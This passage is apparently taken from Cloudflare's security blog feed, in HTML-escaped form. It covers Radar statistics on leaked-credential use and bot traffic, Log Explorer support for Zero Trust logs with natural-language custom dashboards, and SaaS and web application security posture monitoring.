protocol to compare a hash of the detected passwords to hashes of compromised passwords found in databases of leaked credentials. A &lt;a href="https://radar.cloudflare.com/security/application-layer#leaked-credentials-usage"&gt;&lt;u&gt;new Radar graph&lt;/u&gt;&lt;/a&gt; on the worldwide &lt;b&gt;Application Layer&lt;/b&gt; Security page provides visibility into aggregate trends around the detection of leaked credentials in authentication requests. Filterable by authentication requests from human users, bots, or all (human + bot), the graph shows the distribution requests classified as “clean” (no leaked credentials detected) and “compromised” (leaked credentials, as defined above, were used). At a worldwide level, we found that for the first week of March 2025, leaked credentials were used in 64% of all, over 65% of bot, and over 44% of human authorization requests. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5r8sHbOTrQ1ceGpLa0d3Dn/4ea9ab5b342cd394bd096349d4907ab0/image6.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;This suggests that from a human perspective, password reuse is still a problem, as is users not taking immediate actions to change passwords when notified of a breach. And from a bot perspective, this suggests that attackers know that there is a good chance that leaked credentials for one website or application will enable them to access that same user’s account elsewhere.&lt;/p&gt;&lt;p&gt;As a complement to the leaked credentials data, Radar is also now providing a worldwide view into the &lt;a href="https://radar.cloudflare.com/security/application-layer#bot-vs-human"&gt;&lt;u&gt;share of authentication requests originating from bots&lt;/u&gt;&lt;/a&gt;. Note that not all of these requests are necessarily malicious — while some may be associated with &lt;a href="https://www.cloudflare.com/learning/bots/what-is-credential-stuffing/"&gt;credential stuffing-style attacks&lt;/a&gt;, others may be from automated scripts or other benign applications accessing an authentication endpoint. (Having said that, automated malicious attack request volume far exceeds legitimate automated login attempts.) During the first week of March 2025, we found that over 94% of authentication requests came from bots (were automated), with the balance coming from humans. Over that same period, &lt;a href="https://radar.cloudflare.com/traffic?dateStart=2025-03-01&amp;amp;dateEnd=2025-03-07#bot-vs-human"&gt;&lt;u&gt;bot traffic only accounted for 30% of overall requests&lt;/u&gt;&lt;/a&gt;. So although bots don’t represent a majority of request traffic, authentication requests appear to comprise a significant portion of their activity.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/20tYE9sH7SOnJDsnh28ZYz/3c33320a0a7406a348c4b92d22f469ed/image4.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;Bots get a dedicated page&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#bots-get-a-dedicated-page"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;As a reminder, &lt;a href="https://www.cloudflare.com/learning/bots/what-is-a-bot/"&gt;&lt;u&gt;bot&lt;/u&gt;&lt;/a&gt; traffic describes any non-human Internet traffic, and monitoring bot levels can help spot potential malicious activities. Of course, bots can be helpful too, and Cloudflare maintains a list of &lt;a href="https://radar.cloudflare.com/bots#verified-bots"&gt;&lt;u&gt;verified bots&lt;/u&gt;&lt;/a&gt; to help keep the Internet healthy. Given the importance of monitoring bot activity, we have launched a new dedicated &lt;a href="https://radar.cloudflare.com/bots"&gt;&lt;b&gt;&lt;u&gt;Bots&lt;/u&gt;&lt;/b&gt;&lt;/a&gt; page in the Traffic section of Cloudflare Radar to support these efforts. For both worldwide and location views over the selected time period, the page shows the distribution of bot (automated) vs. human HTTP requests, as well as a graph showing bot traffic trends. (Our &lt;a href="https://developers.cloudflare.com/bots/concepts/bot-score/"&gt;&lt;u&gt;bot score&lt;/u&gt;&lt;/a&gt;, combining machine learning, heuristics, and other techniques, is used to identify automated requests likely to be coming from bots.) &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5bvoSNcGRbc2I5RGhZoIdo/948eca1e82148a1db6130295c0ea2f42/image2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Both the &lt;a href="https://radar.cloudflare.com/year-in-review/2023/#bot-traffic-sources"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://radar.cloudflare.com/year-in-review/2024#bot-traffic-sources"&gt;&lt;u&gt;2024&lt;/u&gt;&lt;/a&gt; Cloudflare Radar Year in Review microsites included a “Bot Traffic Sources” section, showing the locations and networks that Cloudflare determined that the largest shares of &lt;a href="https://developers.cloudflare.com/bots/concepts/bot-score/"&gt;&lt;u&gt;automated/likely automated&lt;/u&gt;&lt;/a&gt; traffic was originating from. However, these traffic shares were published just once a year, aggregating traffic from January through the end of November.&lt;/p&gt;&lt;p&gt;In order to provide a more timely perspective, these insights are now available on the new Radar Bots page. Similar to the new &lt;a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/"&gt;DDoS attacks&lt;/a&gt; content discussed above, the &lt;a href="https://radar.cloudflare.com/bots#bot-traffic-sources"&gt;&lt;u&gt;worldwide view&lt;/u&gt;&lt;/a&gt; includes a choropleth map and table illustrating the locations originating the largest shares of all bot traffic. (Note that a similar &lt;a href="https://radar.cloudflare.com/traffic#traffic-characteristics"&gt;&lt;u&gt;Traffic Characteristics&lt;/u&gt;&lt;/a&gt; map and table on the &lt;a href="https://radar.cloudflare.com/traffic"&gt;&lt;u&gt;Traffic Overview page&lt;/u&gt;&lt;/a&gt; ranks locations by the bot traffic share of the location’s total traffic.) Similar to Year in Review data linked above, the United States continues to originate the largest share of bot traffic.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/RPCiFgeihzYIbm4XIdQ1r/ae9afa59586266c785e4e9dfa8cb3428/image11.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;In addition, the worldwide view also breaks out &lt;a href="https://radar.cloudflare.com/bots#bot-traffic-share-by-autonomous-system"&gt;&lt;u&gt;bot traffic share by AS&lt;/u&gt;&lt;/a&gt;, mirroring the treemap shown in the Year in Review. As we have noted &lt;a href="https://blog.cloudflare.com/radar-2024-year-in-review/#the-united-states-was-responsible-for-over-a-third-of-global-bot-traffic-amazon-web-services-was-responsible-for-12-7-of-global-bot-traffic-and-7-8-came-from-google"&gt;&lt;u&gt;previously&lt;/u&gt;&lt;/a&gt;, cloud platform providers account for a significant amount of bot traffic.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5CsXZNKOZ2ssiVaUzVVM51/5d8ad8b6a257eb0413be19fa101806c9/image8.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;At a location level, depending on the country/region selected, the top sources of bot traffic may be cloud/hosting providers, consumer/business network providers, or a mix. For instance, &lt;a href="https://radar.cloudflare.com/bots/fr#bot-traffic-sources"&gt;&lt;u&gt;France’s distribution&lt;/u&gt;&lt;/a&gt; is shown below, and four ASNs account for just over half of the country’s bot traffic. Of these ASNs, two (&lt;a href="https://radar.cloudflare.com/as16276"&gt;&lt;u&gt;AS16276&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://radar.cloudflare.com/as12876"&gt;&lt;u&gt;AS12876&lt;/u&gt;&lt;/a&gt;) belong to cloud/hosting providers, and two (&lt;a href="https://radar.cloudflare.com/as3215"&gt;&lt;u&gt;AS3215&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://radar.cloudflare.com/as12322"&gt;&lt;u&gt;AS12322&lt;/u&gt;&lt;/a&gt;) belong to network providers.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4RM9zvPRa8NzfdTOFMvMcB/b04d53dd725d1890918668775b551004/image9.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;In addition, the &lt;a href="https://radar.cloudflare.com/bots#verified-bots"&gt;&lt;u&gt;Verified Bots list&lt;/u&gt;&lt;/a&gt; has been moved to the new Bots page on Radar. The data shown and functionality remains unchanged, and links to the old location will automatically be redirected to the new one.&lt;/p&gt;

          &lt;/div&gt;
        &lt;p&gt;The Cloudflare dashboard provides customers with specific views of security trends, application and network layer attacks, and bot activity across their sites and applications. While these views are useful at an individual customer level, aggregated views at a worldwide, location, and network level provide a macro-level perspective on trends and activity. These aggregated views available on Cloudflare Radar not only help customers understand how their observations compare to the larger whole, but they also help the industry understand emerging threats that may require action.&lt;/p&gt;&lt;p&gt;The underlying data for the graphs and data discussed above is available via the Radar API (&lt;a href="https://developers.cloudflare.com/api/resources/radar/subresources/attacks/subresources/layer7/"&gt;&lt;u&gt;Application Layer&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/api/resources/radar/subresources/attacks/subresources/layer3/"&gt;&lt;u&gt;Network Layer&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/api/resources/radar/subresources/http/"&gt;&lt;u&gt;Bots&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/api/resources/radar/subresources/leaked_credentials/"&gt;&lt;u&gt;Leaked Credentials&lt;/u&gt;&lt;/a&gt;). The data can also be interactively explored in more detail across locations, networks, and time periods using Radar’s &lt;a href="https://radar.cloudflare.com/explorer"&gt;&lt;u&gt;Data Explorer and AI Assistant&lt;/u&gt;&lt;/a&gt;. And as always, Radar and Data Explorer charts and graphs are downloadable for sharing, and embeddable for use in your own blog posts, websites, or dashboards.&lt;/p&gt;&lt;p&gt;If you share our security, attacks, or bots graphs on social media, be sure to tag us: &lt;a href="https://x.com/CloudflareRadar"&gt;&lt;u&gt;@CloudflareRadar&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://x.com/1111Resolver"&gt;&lt;u&gt;@1111Resolver&lt;/u&gt;&lt;/a&gt; (X), &lt;a href="https://noc.social/@cloudflareradar"&gt;&lt;u&gt;noc.social/@cloudflareradar&lt;/u&gt;&lt;/a&gt; (Mastodon), and &lt;a href="https://bsky.app/profile/radar.cloudflare.com"&gt;&lt;u&gt;radar.cloudflare.com&lt;/u&gt;&lt;/a&gt; (Bluesky).

Today, we are excited to announce that Log Explorer now supports logs from our Zero Trust product suite. In addition, customers can create custom dashboards to monitor suspicious or unusual activity.&lt;/p&gt;&lt;p&gt;Every day, Cloudflare detects and protects customers against billions of threats, including DDoS attacks, bots, web application exploits, and more. SOC analysts, who are charged with keeping their companies safe from the growing spectre of Internet threats, may want to investigate these threats to gain additional insights on attacker behavior and protect against future attacks. Log Explorer, by collecting logs from various Cloudflare products, provides a single starting point for investigations. As a result, analysts can avoid forwarding logs to other tools, maximizing productivity and minimizing costs. Further, analysts can monitor signals specific to their organizations using custom dashboards.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Zero Trust dataset support in Log Explorer&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#zero-trust-dataset-support-in-log-explorer"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Log Explorer stores your Cloudflare logs for a 30-day retention period so that you can analyze them natively and in a single interface, within the Cloudflare Dashboard. Cloudflare log data is diverse, reflecting the breadth of capabilities available.  For example, HTTP requests contain information about the client such as their IP address, request method, &lt;a href="https://www.cloudflare.com/learning/network-layer/what-is-an-autonomous-system/"&gt;&lt;u&gt;autonomous system (ASN)&lt;/u&gt;&lt;/a&gt;, request paths, and TLS versions used. Additionally, Cloudflare’s Application Security &lt;a href="https://developers.cloudflare.com/waf/detections/"&gt;&lt;u&gt;WAF Detections&lt;/u&gt;&lt;/a&gt; enrich these HTTP request logs with additional context, such as the &lt;a href="https://developers.cloudflare.com/waf/detections/attack-score/"&gt;&lt;u&gt;WAF attack score&lt;/u&gt;&lt;/a&gt;, to identify threats.&lt;/p&gt;&lt;p&gt;Today we are announcing that seven additional Cloudflare product datasets are now available in Log Explorer. These seven datasets are the logs generated from our Zero Trust product suite, and include logs from &lt;a href="https://developers.cloudflare.com/logs/reference/log-fields/account/access_requests/"&gt;&lt;u&gt;Access&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/logs/reference/log-fields/account/gateway_dns/"&gt;&lt;u&gt;Gateway DNS&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/logs/reference/log-fields/account/gateway_http/"&gt;&lt;u&gt;Gateway HTTP&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/logs/reference/log-fields/account/gateway_network/"&gt;&lt;u&gt;Gateway Network&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/logs/reference/log-fields/account/casb_findings/"&gt;&lt;u&gt;CASB&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/logs/reference/log-fields/account/zero_trust_network_sessions/"&gt;&lt;u&gt;Zero &lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href="https://developers.cloudflare.com/logs/reference/log-fields/account/zero_trust_network_sessions/"&gt;&lt;u&gt;Trust Network Session&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://developers.cloudflare.com/logs/reference/log-fields/account/device_posture_results/"&gt;&lt;u&gt;Device Posture Results&lt;/u&gt;&lt;/a&gt;. Read on for examples of how to use these logs to identify common threats.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Investigating unauthorized access&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#investigating-unauthorized-access"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;By reviewing Access logs and HTTP request logs, we can reveal attempts to access resources or systems without proper permissions, including brute force password attacks, indicating potential security breaches or malicious activity.&lt;/p&gt;&lt;p&gt;Below, we filter Access Logs on the &lt;code&gt;Allowed&lt;/code&gt; field, to see activity related to unauthorized access.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2piOIdnNz9OWskJqrZJfcf/f88673fc184c23de493920661020e7b3/access_requests.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;By then reviewing the HTTP logs for the requests identified in the previous query, we can assess if bot networks are the source of unauthorized activity.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4b38nYNdpLbmHFt0BHkapa/88e1acf82d8bbc257a7cbbe102cbd723/http_requests.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;With this information, you can craft targeted &lt;a href="https://developers.cloudflare.com/waf/custom-rules/"&gt;&lt;u&gt;Custom Rules&lt;/u&gt;&lt;/a&gt; to block the offending traffic. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Detecting malware&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#detecting-malware"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare's &lt;a href="https://developers.cloudflare.com/cloudflare-one/policies/gateway/"&gt;&lt;u&gt;Web Gateway&lt;/u&gt;&lt;/a&gt; can track which websites users are accessing, allowing administrators to identify and block access to malicious or inappropriate sites. These logs can be used to detect if a user’s machine or account is compromised by malware attacks. When reviewing logs, this may become apparent when we look for records that show a rapid succession of attempts to browse known malicious sites, such as hostnames that have long strings of seemingly random characters that hide their true destination. In this example, we can query logs looking for requests to a spoofed YouTube URL.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5Nkm4udjUw9tmzPk0Fk1eK/524dc1a6d4070a1f6cc9478e09b67ffd/gateway_requests.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h2&gt;Monitoring what matters using custom dashboards&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#monitoring-what-matters-using-custom-dashboards"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Security monitoring is not one size fits all. For instance, companies in the retail or financial industries worry about fraud, while every company is concerned about data exfiltration, of information like trade secrets. And any form of personally identifiable information (PII) is a target for data breaches or ransomware attacks.&lt;/p&gt;&lt;p&gt;While log exploration helps you react to threats, our new custom dashboards allow you to define the specific metrics you need in order to monitor threats you are concerned about. &lt;/p&gt;&lt;p&gt;Getting started is easy, with the ability to create a chart using natural language. A natural language interface is integrated into the chart create/edit experience, enabling you to describe in your own words the chart you want to create. Similar to the &lt;a href="https://blog.cloudflare.com/security-analytics-ai-assistant/"&gt;&lt;u&gt;AI Assistant&lt;/u&gt;&lt;/a&gt; we announced during Security Week 2024, the prompt translates your language to the appropriate chart configuration, which can then be added to a new or existing custom dashboard.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Use a prompt&lt;/b&gt;: Enter a query like “Compare status code ranges over time”. The AI model decides the most appropriate visualization and constructs your chart configuration.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Customize your chart&lt;/b&gt;: Select the chart elements manually, including the chart type, title, dataset to query, metrics, and filters. This option gives you full control over your chart’s structure. &lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div&gt;
  
&lt;/div&gt;
&lt;br /&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Video shows entering a natural language description of desired metric “compare status code ranges over time”, preview chart shown is a time series grouped by error code ranges, selects “add chart” to save to dashboard.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;For more help getting started, we have some pre-built templates that you can use for monitoring specific uses. Available templates currently include: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Bot monitoring&lt;/b&gt;: Identify automated traffic accessing your website&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;API Security:&lt;/b&gt; Monitor the data transfer and exceptions of API endpoints within your application&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;API Performance&lt;/b&gt;: See timing data for API endpoints in your application, along with error rates&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Account Takeover:&lt;/b&gt; View login attempts, usage of leaked credentials, and identify account takeover attacks&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Performance Monitoring&lt;/b&gt;: Identify slow hosts and paths on your origin server, and view &lt;a href="https://blog.cloudflare.com/ttfb-is-not-what-it-used-to-be/"&gt;&lt;u&gt;time to first byte (TTFB)&lt;/u&gt;&lt;/a&gt; metrics over time&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Templates provide a good starting point, and once you create your dashboard, you can add or remove individual charts using the same natural language chart creator. &lt;/p&gt;&lt;div&gt;
  
&lt;/div&gt;
&lt;br /&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Video shows editing chart from an existing dashboard and moving individual charts via drag and drop.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Example use cases&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#example-use-cases"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Custom dashboards can be used to monitor for suspicious activity, or to keep an eye on performance and errors for your domains. Let’s explore some examples of suspicious activity that we can monitor using custom dashboards.&lt;/p&gt;&lt;p&gt;Take, for example, our use case from above: investigating unauthorized access. With custom dashboards, you can create a dashboard using the &lt;b&gt;Account takeover&lt;/b&gt; template to monitor for suspicious login activity related to your domain.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/72KBaEdr0bEn4SNwKOfPfJ/e28997b94630cf856d3924e9ba443063/image7.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;As another example, spikes in requests or errors are common indicators that something is wrong, and they can sometimes be signals of suspicious activity. With the Performance Monitoring template, you can view origin response time and time to first byte metrics as well as monitor for common errors. For example, in this chart, the spikes in 404 errors could be an indication of an unauthorized scan of your endpoints.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3krBxVm8dB5pr5XEoHnVtK/44f682436c3d5a63baa1105987347433/image1.jpg" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;Seamlessly integrated into the Cloudflare platform&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#seamlessly-integrated-into-the-cloudflare-platform"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;When using custom dashboards, if you observe a traffic pattern or spike in errors that you would like to further investigate, you can click the button to “View in Security Analytics” in order to drill down further into the data and craft custom WAF rules to mitigate the threat.  &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5XfvQ24bvDmnNKeInyA8eU/e96798a72e55fa454439f8b85197e02b/image2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;These tools, seamlessly integrated into the Cloudflare platform, will enable users to discover, investigate, and mitigate threats all in one place, reducing time to resolution and overall cost of ownership by eliminating the need to forward logs to third party security analysis tools. And because it is a native part of Cloudflare, you can immediately use the data from your investigation to craft targeted rules that will block these threats. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;What’s next&lt;/h2&gt;

          &lt;/div&gt;
          &lt;p&gt;Stay tuned as we continue to develop more capabilities in the areas of observability and forensics, with additional features including: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Custom alerts&lt;/b&gt;: create alerts based on specific metrics or anomalies&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Scheduled query detections&lt;/b&gt;: craft log queries and run them on a schedule to detect malicious activity&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;More integration&lt;/b&gt;: further streamlining the journey between detect, investigate, and mitigate across the full Cloudflare platform.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;

This diverse infrastructure offers flexibility and scalability, but also opens up new attack surfaces.&lt;/p&gt;&lt;p&gt;To support both business continuity and security needs, “security must evolve from being &lt;a href="https://blog.cloudflare.com/welcome-to-security-week-2025/#how-can-we-help-make-the-internet-better"&gt;&lt;u&gt;reactive to predictive&lt;/u&gt;&lt;/a&gt;”. Maintaining a healthy security posture entails monitoring and strengthening your security defenses to identify risks, ensure compliance, and protect against evolving threats. With our newest capabilities, you can now use Cloudflare to achieve a healthy posture across your SaaS and web applications. This addresses any security team’s ultimate (daily) question: &lt;i&gt;How well are our assets and documents protected&lt;/i&gt;?&lt;/p&gt;&lt;p&gt;A predictive security posture relies on the following key components:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;Real-time discovery and inventory of all your assets and documents&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Continuous asset-aware threat detection and risk assessment&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Prioritised remediation suggestions to increase your protection&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Today, we are sharing how we have built these key components across SaaS and web applications, and how you can use them to manage your business’s security posture.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Your security posture at a glance&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#your-security-posture-at-a-glance"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Regardless of the applications you have &lt;a href="https://developers.cloudflare.com/reference-architecture/architectures/security/#using-cloudflare-to-protect-your-business"&gt;&lt;u&gt;connected to&lt;/u&gt;&lt;/a&gt; Cloudflare’s global network, Cloudflare actively scans for risks and misconfigurations associated with each one of them on a &lt;a href="https://developers.cloudflare.com/security-center/security-insights/how-it-works/#scan-frequency"&gt;&lt;u&gt;regular cadence&lt;/u&gt;&lt;/a&gt;. Identified risks and misconfigurations are surfaced in the dashboard under &lt;a href="https://dash.cloudflare.com/?to=/:account/security-center"&gt;&lt;u&gt;Security Center&lt;/u&gt;&lt;/a&gt; as insights.&lt;/p&gt;&lt;p&gt;Insights are grouped by their severity, type of risks, and corresponding Cloudflare solution, providing various angles for you to zoom in to what you want to focus on. When applicable, a one-click resolution is provided for selected insight types, such as setting &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/additional-options/minimum-tls/"&gt;&lt;u&gt;minimum TLS version&lt;/u&gt;&lt;/a&gt; to 1.2 which is &lt;a href="https://developers.cloudflare.com/ssl/reference/protocols/#decide-which-version-to-use"&gt;&lt;u&gt;recommended by PCI DSS&lt;/u&gt;&lt;/a&gt;. This simplicity is highly appreciated by customers that are managing a growing set of assets being deployed across the organization.&lt;/p&gt;&lt;p&gt;To help shorten the time to resolution even further, we have recently added &lt;a href="https://www.cloudflare.com/learning/access-management/role-based-access-control-rbac/"&gt;&lt;u&gt;role-based access control (RBAC)&lt;/u&gt;&lt;/a&gt; to &lt;a href="https://developers.cloudflare.com/security-center/security-insights/"&gt;&lt;u&gt;Security Insights&lt;/u&gt;&lt;/a&gt; in the Cloudflare dashboard. Now for individual security practitioners, they have access to a distilled view of the insights that are relevant for their role. A user with an &lt;a href="https://developers.cloudflare.com/fundamentals/setup/manage-members/roles/"&gt;&lt;u&gt;administrator role&lt;/u&gt;&lt;/a&gt; (a CSO, for example) has access to, and visibility into, all insights.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/bnaU55Fi2z9bxUxl5pf7o/818043fbba2ae13c5a7c4cb25e5e7ebc/1.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;In addition to account-wide Security Insights, we also provide posture overviews that are closer to the corresponding security configurations of your SaaS and web applications. Let’s dive into each of them.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Securing your SaaS applications&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#securing-your-saas-applications"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Without centralized posture management, SaaS applications can feel like the security wild west. They contain a wealth of sensitive information – files, databases, workspaces, designs, invoices, or anything your company needs to operate, but control is limited to the vendor’s settings, leaving you with less visibility and fewer customization options. Moreover, team members are constantly creating, updating, and deleting content that can cause configuration drift and data exposure, such as sharing files publicly, adding PII to non-compliant databases, or giving access to third party integrations. With Cloudflare, you have visibility across your SaaS application fleet in one dashboard.&lt;/p&gt;&lt;h4&gt;Posture findings across your SaaS fleet&lt;/h4&gt;&lt;p&gt;From the account-wide Security Insights, you can review insights for potential SaaS security issues:&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7JRKfYveWKayrMxdLxLvDB/1c3383209462917214ad9dc6584e98fe/2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;You can choose to dig further with &lt;a href="https://developers.cloudflare.com/cloudflare-one/applications/casb/"&gt;&lt;u&gt;Cloud Access Security Broker (CASB)&lt;/u&gt;&lt;/a&gt; for a thorough review of the misconfigurations, risks, and failures to meet best practices across your SaaS fleet. You can identify a wealth of security information including, but not limited to:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;Publicly available or externally shared files&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Third-party applications with read or edit access&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Unknown or anonymous user access&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Databases with exposed credentials&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Users without two-factor authentication&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Inactive user accounts&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;You can also explore the &lt;i&gt;Posture Findings &lt;/i&gt;page, which provides easy searching and navigation across documents that are stored within the SaaS applications.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6skScbapgiG31w5qRoTCjG/ba3b069de8cce0c0bfcb9f011a2df954/3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Additionally, you can create policies to prevent configuration drift in your environment. Prevention-based policies help maintain a secure configuration and compliance standards, while reducing alert fatigue for Security Operations teams, and these policies can prevent the inappropriate movement or exfiltration of sensitive data. Unifying controls and visibility across environments makes it easier to lock down regulated data classes, maintain detailed audit trails via logs, and improve your security posture to reduce the risk of breaches.&lt;/p&gt;&lt;h4&gt;How it works: new, real-time SaaS documents discovery&lt;/h4&gt;&lt;p&gt;Delivering SaaS security posture information to our customers requires collecting vast amounts of data from a wide range of platforms. In order to ensure that all the documents living in your SaaS apps (files, designs, etc.) are secure, we need to collect information about their configuration — are they publicly shared, do third-party apps have access, is &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-multi-factor-authentication/"&gt;&lt;u&gt;multi-factor authentication (MFA)&lt;/u&gt;&lt;/a&gt; enabled? &lt;/p&gt;&lt;p&gt;We previously did this with crawlers, which would pull data from the SaaS APIs. However, we were plagued with rate limits from the SaaS vendors when working with larger datasets. This forced us to work in batches and ramp scanning up and down as the vendors permitted. This led to stale findings and would make remediation cumbersome and unclear – for example, Cloudflare would be reporting that a file is still shared publicly for a short period after the permissions were removed, leading to customer confusion.&lt;/p&gt;&lt;p&gt;To fix this, we upgraded our data collection pipeline to be dynamic and real-time, reacting to changes in your environment as they occur, whether it’s a new security finding, an updated asset, or a critical alert from a vendor. We started with our Microsoft asset discovery and &lt;a href="https://developers.cloudflare.com/cloudflare-one/applications/casb/casb-integrations/microsoft-365/"&gt;&lt;u&gt;posture findings&lt;/u&gt;&lt;/a&gt;, providing you real-time insight into your Microsoft Admin Center, OneDrive, Outlook, and SharePoint configurations. We will be rapidly expanding support to additional SaaS vendors going 